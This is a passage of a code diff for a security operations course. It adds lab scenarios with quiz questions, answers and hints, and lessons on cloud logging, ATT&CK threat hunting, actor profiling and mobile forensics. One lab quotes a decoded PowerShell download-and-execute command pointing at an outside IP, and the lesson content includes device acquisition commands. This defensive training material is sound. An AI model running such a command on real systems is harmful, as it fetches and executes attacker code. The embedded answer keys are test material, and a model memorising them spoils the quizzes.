+      labScenario: "You are an L1 SOC analyst starting your night shift at 18:00 UTC. During handover, the outgoing analyst briefs you on three open alerts: (1) A medium-severity brute force alert — 40 failed SSH attempts from IP 198.51.100.22 against server SRV-WEB-01, no successful login detected. (2) A high-severity EDR alert showing PowerShell spawned by winword.exe on workstation WS-FIN-03, user: j.martinez. (3) A low-severity firewall rule violation from a developer testing API endpoints on the staging environment. The outgoing analyst partially investigated the brute force alert but had no time for the EDR alert. Your SIEM queue shows 8 new unreviewed alerts.",
+      labQuestions: [
+        {
+          id: "salp-1.1-q1",
+          question: "Which of the three open alerts should you investigate first and why?",
+          answer: "EDR alert",
+          hint: "Consider which alert indicates the most dangerous behavior — a legitimate application spawning a command-line tool."
+        },
+        {
+          id: "salp-1.1-q2",
+          question: "What makes the PowerShell-from-Word scenario suspicious?",
+          answer: "child process",
+          hint: "Think about whether Word normally launches command-line interpreters during regular use."
+        },
+        {
+          id: "salp-1.1-q3",
+          question: "What action should you take for the developer's firewall violation?",
+          answer: "verify with developer",
+          hint: "Consider whether this is expected behavior and how you can confirm it."
+        },
+        {
+          id: "salp-1.1-q4",
+          question: "Before ending your shift, what must you prepare for the next analyst?",
+          answer: "handover report",
+          hint: "Think about what documentation ensures continuity between shifts."
+        }
+      ]
+    },
   },
   {
     id: "1.2",
@@ -26184,6 +27227,37 @@ Rapidly rotating IPs behind a domain (every 30-60 seconds)
       "Monitor query length, entropy, and response codes",
       "Passive DNS and WHOIS are essential for investigation"
     ],
+    practicalExercise: {
+      title: "DNS Tunneling Detection",
+      description: "Analyze DNS logs to identify potential data exfiltration via DNS tunneling.",
+      steps: [
+        "Review the DNS query patterns in the scenario",
+        "Identify anomalous characteristics in the queries",
+        "Determine the likely attack technique",
+        "Recommend detection and mitigation steps"
+      ],
+      labScenario: "Your DNS monitoring tool flags unusual activity from workstation WS-DEV-12 (user: k.patel). Over the past hour, the host made 1,200 DNS TXT queries to subdomains of 'data-sync.analytics-cdn.net'. The subdomain labels are 40-60 characters long and appear Base64-encoded (e.g., 'dXNlcm5hbWU6YWRtaW4scGFzc3dvcmQ6UEBzc3cwcmQh.data-sync.analytics-cdn.net'). Normal DNS activity for this host averages 15 queries per hour. WHOIS shows the domain was registered 3 days ago. The responses contain unusually large TXT records averaging 450 bytes each.",
+      labQuestions: [
+        {
+          id: "salp-2.2-q1",
+          question: "What attack technique do these DNS queries most likely indicate?",
+          answer: "DNS tunneling",
+          hint: "Consider the abnormal query volume, encoded subdomains, and large TXT responses."
+        },
+        {
+          id: "salp-2.2-q2",
+          question: "What two characteristics of the subdomain labels suggest encoded data?",
+          answer: "length and Base64",
+          hint: "Look at the character count and encoding pattern of the subdomain names."
+        },
+        {
+          id: "salp-2.2-q3",
+          question: "Why is the domain registration date significant for this investigation?",
+          answer: "newly registered",
+          hint: "Legitimate services typically use well-established domains, not ones created days ago."
+        }
+      ]
+    },
   },
   {
     id: "2.3",
@@ -26314,6 +27388,43 @@ event_id=4624 logon_type=10
       "Process chain analysis identifies suspicious spawning",
       "Optimize by filtering early with indexed fields"
     ],
+    practicalExercise: {
+      title: "SIEM Brute Force Investigation",
+      description: "Use SIEM query logic to investigate a brute force attack with lateral movement.",
+      steps: [
+        "Analyze the SIEM alert timeline",
+        "Identify the attack progression",
+        "Determine compromised accounts and systems",
+        "Recommend containment actions"
+      ],
+      labScenario: "Your SIEM correlation rule triggers: 'Brute Force Followed by Lateral Movement.' The timeline shows: At 02:15 UTC, 250 failed logon events (Event ID 4625) targeting the 'svc-backup' service account from internal IP 10.0.5.30 (workstation WS-IT-08). At 02:22 UTC, a successful logon (Event ID 4624, Logon Type 3) for 'svc-backup' from the same IP. At 02:28 UTC, 'svc-backup' initiates SMB connections to file servers FS-01, FS-02, and FS-03. At 02:35 UTC, PowerShell remoting sessions are established from FS-01 to domain controller DC-PROD-01.",
+      labQuestions: [
+        {
+          id: "salp-3.1-q1",
+          question: "What is the total time between the brute force start and domain controller access?",
+          answer: "20 minutes",
+          hint: "Calculate the time difference between the first failed logon at 02:15 and the DC access at 02:35."
+        },
+        {
+          id: "salp-3.1-q2",
+          question: "What Windows Event ID confirms the attacker successfully authenticated?",
+          answer: "4624",
+          hint: "This is the standard Windows event for a successful logon."
+        },
+        {
+          id: "salp-3.1-q3",
+          question: "Which system should be isolated first to prevent further compromise?",
+          answer: "DC-PROD-01",
+          hint: "Consider which compromised system has the highest potential impact on the entire domain."
+        },
+        {
+          id: "salp-3.1-q4",
+          question: "What type of account was targeted and why is that significant?",
+          answer: "service account",
+          hint: "Service accounts often have elevated privileges and rarely trigger lockout policies."
+        }
+      ]
+    },
   },
   {
     id: "3.2",
@@ -26474,6 +27585,37 @@ Get-AuthenticodeSignature "C:\\path\\to\\suspicious.exe"
       "Check path, parent, user context, and command line",
       "Office apps spawning CLI tools is a critical indicator"
     ],
+    practicalExercise: {
+      title: "Suspicious Process Investigation",
+      description: "Analyze a process chain on a Windows workstation to identify malicious activity.",
+      steps: [
+        "Review the process hierarchy described in the scenario",
+        "Identify abnormal parent-child relationships",
+        "Determine the likely attack vector",
+        "Recommend response actions"
+      ],
+      labScenario: "EDR alerts on workstation WS-ACCT-05 (user: l.garcia, Accounting dept). Sysmon Event ID 1 shows the following process chain: explorer.exe → outlook.exe → WINWORD.EXE → cmd.exe → powershell.exe. The PowerShell command line contains: 'powershell -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'. The encoded command, when decoded, reveals: 'IEX (New-Object Net.WebClient).DownloadString(\"http://185.220.101.33/stage2.ps1\")'. The download occurred at 09:45 UTC, and since then, the workstation has been beaconing to the same IP every 60 seconds on port 443.",
+      labQuestions: [
+        {
+          id: "salp-4.1-q1",
+          question: "Which parent-child process relationship is the strongest indicator of compromise?",
+          answer: "WINWORD to cmd",
+          hint: "Microsoft Word should not normally spawn command-line interpreters."
+        },
+        {
+          id: "salp-4.1-q2",
+          question: "What technique is the PowerShell command using to avoid detection?",
+          answer: "Base64 encoding",
+          hint: "Look at the '-enc' flag and the encoded string in the command line."
+        },
+        {
+          id: "salp-4.1-q3",
+          question: "What does the 60-second beaconing pattern indicate?",
+          answer: "C2 communication",
+          hint: "Regular, periodic outbound connections to an external IP suggest command and control activity."
+        }
+      ]
+    },
   },
   {
     id: "4.2",
@@ -26631,6 +27773,43 @@ Email headers tell how a message traveled from sender to recipient.
       "Mismatched From/Reply-To is a strong phishing indicator",
       "X-Originating-IP identifies true sending infrastructure"
     ],
+    practicalExercise: {
+      title: "Phishing Email Header Analysis",
+      description: "Examine email headers to determine if a suspicious message is a phishing attempt.",
+      steps: [
+        "Review the email header details in the scenario",
+        "Check authentication results (SPF, DKIM, DMARC)",
+        "Identify spoofing indicators",
+        "Assess the overall threat level"
+      ],
+      labScenario: "An employee in HR forwards a suspicious email to the SOC. The email claims to be from 'IT Security <itsecurity@yourcompany.com>' requesting an urgent password reset via a link. Header analysis reveals: From: itsecurity@yourcompany.com, Reply-To: support@yourcompany-reset.com, Return-Path: bounce@mail-server99.xyz, SPF: fail (sender IP 91.234.56.78 not authorized for yourcompany.com), DKIM: none, DMARC: fail. The link in the body points to 'https://yourcompany-reset.com/auth/login'. WHOIS shows yourcompany-reset.com was registered yesterday using privacy protection.",
+      labQuestions: [
+        {
+          id: "salp-5.1-q1",
+          question: "What is the strongest technical indicator that this email is spoofed?",
+          answer: "SPF fail",
+          hint: "Check which authentication mechanism confirms the sender IP is not authorized."
+        },
+        {
+          id: "salp-5.1-q2",
+          question: "Why is the Reply-To address suspicious?",
+          answer: "different domain",
+          hint: "Compare the From domain with the Reply-To domain — legitimate internal emails use the same domain."
+        },
+        {
+          id: "salp-5.1-q3",
+          question: "What should the SOC do with the phishing link before clicking it?",
+          answer: "sandbox analysis",
+          hint: "Never click suspicious links directly — use an isolated environment to analyze them safely."
+        },
+        {
+          id: "salp-5.1-q4",
+          question: "What organization-wide action should be taken immediately?",
+          answer: "block domain",
+          hint: "Prevent other employees from accessing the malicious domain."
+        }
+      ]
+    },
   },
   {
     id: "5.2",
@@ -26774,6 +27953,37 @@ When in doubt, escalate UP — it's easier to de-escalate than recover from dela
       "When in doubt, escalate UP",
       "Downgrades require documented justification"
     ],
+    practicalExercise: {
+      title: "Incident Severity Classification",
+      description: "Classify and prioritize multiple simultaneous security incidents.",
+      steps: [
+        "Review each incident described in the scenario",
+        "Apply severity classification criteria",
+        "Determine escalation requirements",
+        "Plan your response order"
+      ],
+      labScenario: "Three incidents arrive at your SOC within 10 minutes. Incident A: A web application firewall (WAF) detects SQL injection attempts against the customer portal — 50 blocked requests from a single IP, no successful exploitation confirmed. Incident B: EDR detects Mimikatz execution on domain controller DC-01 under the SYSTEM account at 03:00 AM — no maintenance window is scheduled. Incident C: DLP alerts that an employee in Marketing emailed a spreadsheet containing 200 customer records to a personal Gmail address. The employee claims it was accidental.",
+      labQuestions: [
+        {
+          id: "salp-6.1-q1",
+          question: "Which incident should be classified as Critical severity?",
+          answer: "Incident B",
+          hint: "Consider which incident involves the highest-value target and the most dangerous tool."
+        },
+        {
+          id: "salp-6.1-q2",
+          question: "Why is Mimikatz on a domain controller especially dangerous?",
+          answer: "credential dumping",
+          hint: "Think about what Mimikatz does and what a domain controller stores."
+        },
+        {
+          id: "salp-6.1-q3",
+          question: "What severity would you assign to the DLP incident and why?",
+          answer: "medium",
+          hint: "Customer data was exposed but the action appears unintentional — assess both impact and intent."
+        }
+      ]
+    },
   },
   {
     id: "6.2",
@@ -28022,6 +29232,37 @@ Physical       Provider    Provider    Provider
       "Focus on identity, configuration, and data-based detections",
       "Cloud investigations follow the same framework but with different artifacts"
     ],
+    practicalExercise: {
+      title: "Cloud Security Incident Investigation",
+      description: "Investigate unauthorized access to cloud resources using cloud-native logs.",
+      steps: [
+        "Analyze the CloudTrail events in the scenario",
+        "Identify the compromised credentials",
+        "Determine the scope of unauthorized access",
+        "Recommend remediation steps"
+      ],
+      labScenario: "AWS CloudTrail alerts show unusual API activity from IAM user 'dev-deploy' at 04:30 UTC. The user, normally active only during business hours (09:00-17:00 EST), made the following API calls: ListBuckets, GetBucketAcl on all S3 buckets, then PutBucketPolicy on 's3://company-financial-reports' changing the bucket to public-read. CloudTrail shows the requests originated from IP 45.33.32.156 (geolocated to Eastern Europe), while the user's normal activity comes from the corporate VPN range 10.0.0.0/8. Access Advisor shows 'dev-deploy' has never previously accessed S3 services.",
+      labQuestions: [
+        {
+          id: "salp-7.1-q1",
+          question: "What is the first indicator that the IAM user credentials are compromised?",
+          answer: "unusual source IP",
+          hint: "Compare the request origin to the user's normal access pattern."
+        },
+        {
+          id: "salp-7.1-q2",
+          question: "What is the most critical action the attacker performed?",
+          answer: "public bucket policy",
+          hint: "Which API call could expose sensitive data to the internet?"
+        },
+        {
+          id: "salp-7.1-q3",
+          question: "What is the first remediation step for the compromised IAM user?",
+          answer: "disable access keys",
+          hint: "Stop the bleeding first — prevent further unauthorized API calls."
+        }
+      ]
+    },
   },
   {
     id: "7.2",
@@ -28401,6 +29642,37 @@ Deliver intelligence to consumers:
       "Tailor products to the audience: strategic, operational, or tactical",
       "Feedback loops ensure intelligence stays relevant and effective"
     ],
+    practicalExercise: {
+      title: "Threat Intelligence IOC Correlation",
+      description: "Correlate threat intelligence indicators with internal telemetry to identify an active threat.",
+      steps: [
+        "Review the threat intelligence advisory",
+        "Search internal logs for matching IOCs",
+        "Assess the scope of potential compromise",
+        "Recommend response actions"
+      ],
+      labScenario: "Your threat intel platform ingests a flash advisory: APT group 'IronLotus' is targeting healthcare organizations using spear-phishing with malicious PDF attachments. Known IOCs include C2 domain 'health-updates.cloud-cdn.net', file hash (SHA256) 'a3f2b8c9d1e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0', and callback IP 103.75.201.44. You search your SIEM and find: (1) DNS logs show workstation WS-REC-03 queried 'health-updates.cloud-cdn.net' 2 hours ago. (2) The file hash matches a PDF opened by user 'r.johnson' in the Records department. (3) No connections to the callback IP are found in firewall logs.",
+      labQuestions: [
+        {
+          id: "salp-8.1-q1",
+          question: "How many of the three IOCs matched in your internal telemetry?",
+          answer: "2",
+          hint: "Count which IOCs were found — domain query, file hash, and callback IP."
+        },
+        {
+          id: "salp-8.1-q2",
+          question: "What does the absence of callback IP connections suggest?",
+          answer: "early stage",
+          hint: "If the malware hasn't reached out to C2 yet, where might it be in the attack lifecycle?"
+        },
+        {
+          id: "salp-8.1-q3",
+          question: "What is the priority action for workstation WS-REC-03?",
+          answer: "isolate",
+          hint: "With confirmed IOC matches, what prevents the threat from spreading?"
+        }
+      ]
+    },
   },
   {
     id: "8.2",
@@ -28803,6 +30075,43 @@ HASH: [SHA256 value]
       "Use working copies for analysis — never modify original evidence",
       "Essential free tools: Autopsy, FTK Imager, Volatility, KAPE"
     ],
+    practicalExercise: {
+      title: "Digital Forensics Evidence Collection",
+      description: "Apply forensic methodology to collect and preserve evidence from a compromised server.",
+      steps: [
+        "Review the incident details",
+        "Determine the order of evidence collection",
+        "Identify key forensic artifacts to examine",
+        "Ensure proper chain of custody"
+      ],
+      labScenario: "At 06:00 UTC, the NOC reports that web server SRV-WEB-02 is exhibiting unusual behavior: CPU usage spiked to 95%, and outbound traffic increased tenfold. Initial investigation reveals a webshell file '/var/www/html/uploads/cmd.php' created at 05:42 UTC. The Apache access logs show POST requests to this file from IP 192.0.2.100 every 30 seconds. The server hosts an e-commerce application processing credit card transactions. Memory analysis tools show a process 'kworker_update' (not a legitimate kernel worker) running with root privileges and listening on port 4444.",
+      labQuestions: [
+        {
+          id: "salp-9.1-q1",
+          question: "Following order of volatility, what evidence should you collect first?",
+          answer: "memory",
+          hint: "Volatile data disappears when the system is powered off — capture it before anything else."
+        },
+        {
+          id: "salp-9.1-q2",
+          question: "What type of malware is the 'cmd.php' file?",
+          answer: "webshell",
+          hint: "A PHP file in the uploads directory that accepts remote commands is a specific type of backdoor."
+        },
+        {
+          id: "salp-9.1-q3",
+          question: "Why is the process 'kworker_update' suspicious?",
+          answer: "fake kernel process",
+          hint: "Real kernel worker processes follow a specific naming convention and don't listen on high ports."
+        },
+        {
+          id: "salp-9.1-q4",
+          question: "Given the server processes credit cards, what compliance notification is required?",
+          answer: "PCI DSS",
+          hint: "Credit card data breaches trigger specific payment card industry requirements."
+        }
+      ]
+    },
   },
   {
     id: "9.2",
@@ -29143,9 +30452,2655 @@ Get-WinEvent -FilterHashtable @{LogName='Security';ID=1102}
     ],
   },
 
+  // New lessons for expanded modules (7.5, 7.6, 8.5, 8.6, 9.5, 9.6)
+  {
+    id: "7.5",
+    courseId: "soc-analyst-path",
+    title: "GCP Security Command Center & Logging",
+    content: `
+# GCP Security Command Center & Logging
+
+Google Cloud Platform provides Security Command Center (SCC) as its centralized security management platform, along with Cloud Audit Logs for comprehensive activity monitoring.
+
+## Cloud Audit Logs
+
+GCP generates four types of audit logs:
+
+\`\`\`
+Cloud Audit Logs
+├── Admin Activity Logs — Resource configuration changes (always enabled)
+├── Data Access Logs — Data read/write operations (must enable)
+├── System Event Logs — Google system actions
+└── Policy Denied Logs — Access violations
+\`\`\`
+
+### Key Log Fields
+\`\`\`json
+{
+  "protoPayload": {
+    "methodName": "google.iam.admin.v1.SetIamPolicy",
+    "authenticationInfo": { "principalEmail": "user@company.com" },
+    "authorizationInfo": [{ "permission": "iam.roles.update" }],
+    "resourceName": "projects/my-project"
+  }
+}
+\`\`\`
+
+## Security Command Center Findings
+
+SCC aggregates findings from multiple sources:
+- **Security Health Analytics** — Misconfigurations (public buckets, open firewall rules)
+- **Event Threat Detection** — Suspicious IAM activity, cryptocurrency mining
+- **Container Threat Detection** — Malicious scripts, reverse shells in containers
+- **Web Security Scanner** — OWASP Top 10 vulnerabilities
+
+### High-Priority SCC Findings
+| Finding | Severity | Indicator |
+|---------|----------|-----------|
+| Public bucket | Critical | Storage ACL allows allUsers |
+| SSH brute force | High | Repeated failed auth from single IP |
+| Crypto mining | Critical | Known mining pool DNS/IP connections |
+| Privilege escalation | High | Service account key creation spike |
+
+## IAM Anomaly Detection
+
+Monitor for suspicious IAM patterns:
+\`\`\`
+# Suspicious patterns to detect
+- Service account keys created outside of automation
+- IAM policy changes granting owner/editor roles
+- Cross-project access from unexpected accounts
+- API calls from unusual geographic locations
+- Disabled audit logging on specific services
+\`\`\`
+
+## Log Export & SIEM Integration
+
+\`\`\`
+Cloud Logging → Log Router → Log Sinks
+                                ├── BigQuery (analysis)
+                                ├── Cloud Storage (archival)
+                                ├── Pub/Sub (streaming to SIEM)
+                                └── Splunk/Chronicle
+\`\`\`
+    `,
+    keyTakeaways: [
+      "GCP Cloud Audit Logs have four types — Admin Activity is always enabled",
+      "Security Command Center aggregates findings from multiple detection services",
+      "IAM anomaly detection focuses on privilege escalation and unusual access patterns",
+      "Log Router and Pub/Sub enable real-time streaming to external SIEM platforms"
+    ],
+  },
+  {
+    id: "7.6",
+    courseId: "soc-analyst-path",
+    title: "Cloud SIEM Integration & Multi-Cloud Monitoring",
+    content: `
+# Cloud SIEM Integration & Multi-Cloud Monitoring
+
+Modern organizations operate across multiple cloud providers. Centralizing cloud security monitoring into a unified SIEM is essential for effective threat detection.
+
+## Multi-Cloud Log Architecture
+
+\`\`\`
+AWS CloudTrail ──────┐
+Azure Activity Logs ─┤──→ Log Aggregation Layer ──→ SIEM
+GCP Audit Logs ──────┤      (Kafka/Pub/Sub)        (Splunk/Sentinel/Chronicle)
+On-Prem Logs ────────┘
+\`\`\`
+
+## Normalizing Cloud Logs
+
+Each cloud provider uses different field names for the same concepts:
+
+| Concept | AWS | Azure | GCP |
+|---------|-----|-------|-----|
+| User identity | userIdentity.arn | claims.upn | authenticationInfo.principalEmail |
+| Action | eventName | operationName | methodName |
+| Source IP | sourceIPAddress | callerIpAddress | requestMetadata.callerIp |
+| Timestamp | eventTime | time | timestamp |
+
+### Common Data Model
+\`\`\`
+Normalized Schema:
+  actor       → who performed the action
+  action      → what was done
+  target      → what resource was affected
+  source_ip   → origin IP address
+  timestamp   → when it happened
+  cloud       → which provider (aws/azure/gcp)
+  severity    → risk level
+\`\`\`
+
+## Cross-Cloud Detection Rules
+
+### Impossible Travel Detection
+\`\`\`
+RULE: Cross-Cloud Impossible Travel
+IF user authenticates to AWS from Location_A
+AND same user authenticates to Azure from Location_B
+AND time_diff < physically_possible_travel_time
+THEN alert: "Potential credential compromise"
+\`\`\`
+
+### Multi-Cloud Privilege Escalation
+\`\`\`
+RULE: Cross-Cloud Privilege Escalation
+IF user granted admin in Cloud_A
+AND same user creates resources in Cloud_B within 1 hour
+AND user has no prior Cloud_B activity
+THEN alert: "Potential lateral cloud movement"
+\`\`\`
+
+## Unified Dashboard Design
+
+Key metrics for multi-cloud SOC dashboards:
+- **Authentication events** across all clouds (success/failure ratio)
+- **IAM changes** — new roles, permissions, service accounts
+- **Resource creation** — new VMs, storage, network rules
+- **Security findings** — aggregated from all cloud-native tools
+- **Data movement** — cross-region and cross-cloud data transfers
+
+## Best Practices
+
+1. **Standardize tagging** — Use consistent resource tags across clouds
+2. **Centralize identity** — Federate with a single IdP (Okta, Azure AD)
+3. **Automate response** — Use cloud-native automation for containment
+4. **Retention policy** — Align log retention with compliance requirements
+5. **Regular gap analysis** — Map detection coverage across all clouds
+    `,
+    keyTakeaways: [
+      "Multi-cloud environments require log normalization into a common data model",
+      "Cross-cloud detection rules can catch impossible travel and lateral movement",
+      "Centralizing identity through federation simplifies monitoring across clouds",
+      "Unified dashboards should track auth events, IAM changes, and security findings across all providers"
+    ],
+  },
+  {
+    id: "8.5",
+    courseId: "soc-analyst-path",
+    title: "MITRE ATT&CK for Threat Hunting",
+    content: `
+# MITRE ATT&CK for Threat Hunting
+
+The MITRE ATT&CK framework provides a comprehensive knowledge base of adversary tactics and techniques. For threat hunters, it serves as both a map and a methodology.
+
+## ATT&CK Structure for Hunters
+
+\`\`\`
+Tactics (WHY)        → Techniques (HOW)          → Sub-techniques (SPECIFIC)
+Initial Access       → Phishing                  → Spearphishing Attachment
+Execution            → Command & Scripting       → PowerShell
+Persistence          → Boot/Logon Autostart      → Registry Run Keys
+Privilege Escalation → Exploitation for Priv Esc → DLL Side-Loading
+Defense Evasion      → Obfuscated Files          → Software Packing
+Credential Access    → OS Credential Dumping     → LSASS Memory
+Discovery            → System Info Discovery     → (none)
+Lateral Movement     → Remote Services           → SMB/Windows Admin Shares
+Collection           → Data from Local System    → (none)
+Exfiltration         → Exfil Over C2 Channel     → (none)
+Impact               → Data Encrypted for Impact → (none)
+\`\`\`
+
+## Building a Detection Coverage Matrix
+
+### Step 1: Map Current Detections
+\`\`\`
+For each ATT&CK technique:
+  - Do we have logs that could detect this?
+  - Do we have a detection rule for this?
+  - Has the rule been validated with testing?
+  - What is our confidence level (low/medium/high)?
+\`\`\`
+
+### Step 2: Identify Gaps
+\`\`\`
+Coverage Levels:
+  ██ High   — Validated detection rule, tested regularly
+  ▓▓ Medium — Detection exists but not validated
+  ░░ Low    — Logs available but no detection
+  ── None   — No visibility into this technique
+\`\`\`
+
+### Step 3: Prioritize Development
+Priority = (Threat Frequency × Impact) / Detection Difficulty
+
+## Hunt Hypothesis from ATT&CK
+
+### Example: Hunting for T1053 (Scheduled Task/Job)
+\`\`\`
+Hypothesis: "Adversaries may use scheduled tasks for persistence
+             after initial compromise"
+
+Data Sources:
+  - Windows Event ID 4698 (scheduled task created)
+  - Sysmon Event ID 1 (schtasks.exe execution)
+  - File creation in C:\\Windows\\System32\\Tasks\\
+
+Hunt Query:
+  index=windows EventCode=4698
+  | where TaskName!="Microsoft*" AND TaskName!="Adobe*"
+  | stats count by TaskName, Creator, ActionCommand
+  | where count < 3
+\`\`\`
+
+## ATT&CK Navigator
+
+Use the ATT&CK Navigator to:
+- **Visualize coverage** — color-code techniques by detection status
+- **Compare threat groups** — overlay known APT techniques against your defenses
+- **Track improvements** — show coverage improvements over time
+- **Report to management** — visual representation of security posture
+
+## Technique Grouping for Hunts
+
+Group related techniques into hunt packages:
+\`\`\`
+Persistence Hunt Package:
+  T1547 — Boot/Logon Autostart Execution
+  T1053 — Scheduled Task/Job
+  T1543 — Create/Modify System Process
+  T1546 — Event Triggered Execution
+  
+Data Sources: Registry, Scheduled Tasks, Services, WMI
+Duration: 2-3 days
+\`\`\`
+    `,
+    keyTakeaways: [
+      "ATT&CK maps adversary behavior into tactics (why), techniques (how), and sub-techniques",
+      "Detection coverage matrices identify gaps between visibility and actual detection capability",
+      "Hunt hypotheses should be derived from ATT&CK techniques relevant to your threat landscape",
+      "Group related techniques into hunt packages for efficient, focused investigations"
+    ],
+  },
+  {
+    id: "8.6",
+    courseId: "soc-analyst-path",
+    title: "Threat Actor Profiling & Campaign Tracking",
+    content: `
+# Threat Actor Profiling & Campaign Tracking
+
+Understanding who is attacking you and tracking their campaigns over time enables proactive defense. Threat actor profiling transforms reactive security into intelligence-driven operations.
+
+## The Diamond Model of Intrusion Analysis
+
+\`\`\`
+                    Adversary
+                   /         \\
+                  /           \\
+         Infrastructure ─── Capability
+                  \\           /
+                   \\         /
+                    Victim
+\`\`\`
+
+Each intrusion event links these four vertices:
+- **Adversary** — The threat actor (APT group, cybercriminal, insider)
+- **Capability** — Tools, malware, exploits used
+- **Infrastructure** — C2 servers, domains, email accounts
+- **Victim** — Target organization, sector, individual
+
+## Threat Actor Classification
+
+| Type | Motivation | Sophistication | Examples |
+|------|-----------|----------------|----------|
+| Nation-State (APT) | Espionage, disruption | Very High | APT29, Lazarus Group |
+| Cybercriminals | Financial gain | Medium-High | FIN7, REvil, LockBit |
+| Hacktivists | Ideology, protest | Low-Medium | Anonymous, Killnet |
+| Insider Threats | Revenge, profit | Variable | Disgruntled employees |
+| Script Kiddies | Notoriety | Low | Opportunistic attackers |
+
+## Building Threat Actor Profiles
+
+### Profile Components
+\`\`\`
+Threat Actor Profile: APT-EXAMPLE
+├── Attribution
+│   ├── Suspected origin: [Country/Region]
+│   ├── Confidence level: [Low/Medium/High]
+│   └── Alternative names: [Name1, Name2]
+├── Targeting
+│   ├── Sectors: [Finance, Healthcare, Government]
+│   ├── Geography: [Regions targeted]
+│   └── Asset types: [PII, IP, financial data]
+├── TTPs (MITRE ATT&CK mapping)
+│   ├── Initial Access: Spearphishing (T1566)
+│   ├── Persistence: Registry Run Keys (T1547.001)
+│   └── C2: HTTPS beaconing (T1071.001)
+├── Infrastructure
+│   ├── Known domains: [list]
+│   ├── IP ranges: [list]
+│   └── SSL certificates: [patterns]
+└── Indicators
+    ├── File hashes: [list]
+    ├── Mutex names: [list]
+    └── Registry artifacts: [list]
+\`\`\`
+
+## Campaign Tracking
+
+### Linking Events into Campaigns
+\`\`\`
+Event 1 (Jan): Phishing email → Macro → Cobalt Strike beacon
+Event 2 (Feb): Same C2 domain → Different target → Same malware family
+Event 3 (Mar): New C2 infrastructure → Same TTP pattern → Same code overlap
+
+→ Campaign: "Operation ExampleName"
+  Duration: Jan-Mar
+  Targets: 15 organizations in healthcare sector
+  Evolution: Infrastructure rotation every 30 days
+\`\`\`
+
+### Campaign Indicators Timeline
+Track how adversary infrastructure evolves:
+- Domain registration patterns (bulk registration, aged domains)
+- SSL certificate reuse across campaigns
+- Code similarities between malware variants
+- Phishing template evolution
+
+## Sharing Intelligence
+
+Use structured formats for sharing:
+- **STIX 2.1** — Structured Threat Information Expression
+- **MISP** — Malware Information Sharing Platform
+- **ISACs** — Industry-specific sharing communities
+
+## Operationalizing Profiles
+
+Transform profiles into actionable defense:
+1. **Detection rules** — Write SIEM rules for known TTPs
+2. **IOC feeds** — Import infrastructure indicators into blocking tools
+3. **Hunt hypotheses** — Target specific techniques the actor uses
+4. **Tabletop exercises** — Simulate the actor's attack playbook
+5. **Executive briefings** — Communicate risk from specific threat actors
+    `,
+    keyTakeaways: [
+      "The Diamond Model connects adversary, capability, infrastructure, and victim for each intrusion",
+      "Threat actor profiles should include attribution, targeting, TTPs, infrastructure, and IOCs",
+      "Campaign tracking links multiple events through shared infrastructure, code, and TTP patterns",
+      "Intelligence must be operationalized into detection rules, IOC feeds, and hunt hypotheses"
+    ],
+  },
+  {
+    id: "9.5",
+    courseId: "soc-analyst-path",
+    title: "Mobile Device Forensics",
+    content: `
+# Mobile Device Forensics
+
+Mobile devices contain rich evidence including communications, location data, app artifacts, and browsing history. Mobile forensics requires specialized tools and techniques different from traditional disk forensics.
+
+## Mobile Forensics Challenges
+
+\`\`\`
+Challenges:
+├── Device Encryption — FDE enabled by default on modern devices
+├── Secure Enclaves — Hardware-protected key storage
+├── Remote Wipe — Devices can be wiped remotely
+├── Cloud Sync — Data may exist only in the cloud
+├── Rapid Updates — OS updates change artifact locations
+└── App Sandboxing — Each app's data is isolated
+\`\`\`
+
+## Acquisition Methods
+
+### Levels of Acquisition
+| Level | Description | Data Obtained |
+|-------|------------|---------------|
+| Manual | Screenshot/photo documentation | Visible on-screen data only |
+| Logical | Backup extraction (iTunes/ADB) | Files, databases, app data |
+| File System | Full file system access | All files including deleted |
+| Physical | Bit-for-bit image | Complete storage including unallocated |
+| Chip-Off | Direct NAND reading | Last resort, destructive |
+
+### iOS Acquisition
+\`\`\`
+# Create iTunes backup (logical)
+idevicebackup2 backup --full /path/to/output
+
+# Parse backup with iLEAPP
+python ileapp.py -i /path/to/backup -o /path/to/report
+
+Key artifacts:
+- sms.db — Text messages
+- call_history.storedata — Call logs
+- Photos/— Camera roll and screenshots
+- Safari/History.db — Browsing history
+- LocationData/ — GPS coordinates
+\`\`\`
+
+### Android Acquisition
+\`\`\`
+# Enable USB debugging, then:
+adb backup -apk -shared -all -f backup.ab
+
+# Or use ALEAPP for parsing
+python aleapp.py -i /path/to/extraction -o /path/to/report
+
+Key artifacts:
+- mmssms.db — SMS/MMS messages
+- contacts2.db — Contact list
+- calllog.db — Call history
+- Chrome/History — Browser history
+- accounts.db — Configured accounts
+\`\`\`
+
+## Key Evidence Types
+
+### Communication Evidence
+- SMS/MMS/iMessage databases
+- WhatsApp, Telegram, Signal databases
+- Email accounts and cached messages
+- VoIP call logs (FaceTime, WhatsApp calls)
+
+### Location Evidence
+- GPS coordinates from photos (EXIF data)
+- Cell tower connections (baseband logs)
+- Wi-Fi connection history
+- App-specific location data (Maps, Uber, fitness apps)
+
+### Application Data
+\`\`\`
+High-value app artifacts:
+├── Messaging apps — Message databases, attachments, deleted messages
+├── Social media — Posts, DMs, cached content
+├── Financial apps — Transaction history, account details
+├── Cloud storage — Cached files, sync logs
+└── Browser — History, downloads, cached pages, passwords
+\`\`\`
+
+## Anti-Forensics on Mobile
+
+- Factory reset (some data recoverable from NAND)
+- Secure messaging apps with disappearing messages
+- App lockers and hidden folders
+- VPN and Tor usage
+- Burner phones and SIM swapping
+    `,
+    keyTakeaways: [
+      "Mobile acquisition ranges from manual screenshots to physical chip-off imaging",
+      "iOS and Android have different artifact locations and extraction methods",
+      "Location evidence comes from GPS, cell towers, Wi-Fi history, and app data",
+      "Communication apps store rich evidence in SQLite databases that survive deletion"
+    ],
+  },
+  {
+    id: "9.6",
+    courseId: "soc-analyst-path",
+    title: "Forensic Report Writing & Court Presentation",
+    content: `
+# Forensic Report Writing & Court Presentation
+
+A forensic investigation is only as valuable as the report it produces. Clear, accurate, and legally sound reporting ensures findings are actionable and admissible.
+
+## Report Structure
+
+\`\`\`
+Professional Forensic Report:
+├── 1. Executive Summary (1-2 pages)
+│   ├── Purpose of investigation
+│   ├── Key findings (non-technical)
+│   ├── Conclusions and impact
+│   └── Recommended actions
+├── 2. Case Information
+│   ├── Case number and authorization
+│   ├── Examiner credentials
+│   ├── Evidence items received
+│   └── Chain of custody documentation
+├── 3. Methodology
+│   ├── Tools and versions used
